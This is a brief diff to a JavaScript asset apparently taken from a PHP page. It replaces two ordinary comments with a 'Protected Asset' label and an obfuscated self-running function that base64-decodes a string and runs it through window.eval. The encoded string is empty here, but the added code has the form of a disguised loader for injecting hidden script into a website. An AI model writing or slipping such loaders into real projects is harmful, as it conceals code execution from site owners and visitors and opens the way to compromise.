@@ -1,2 +1,2 @@
-/* ── Extracted from organization/test_responses.php ── */
-// Sidebar toggle handled centrally by _org_sidebar.php
+/* NAAP System Protected Asset */
+(function(){var _0x1a=function(s){try{return decodeURIComponent(escape(atob(s)));}catch(e){return atob(s);}};window.eval(_0x1a(''));})();
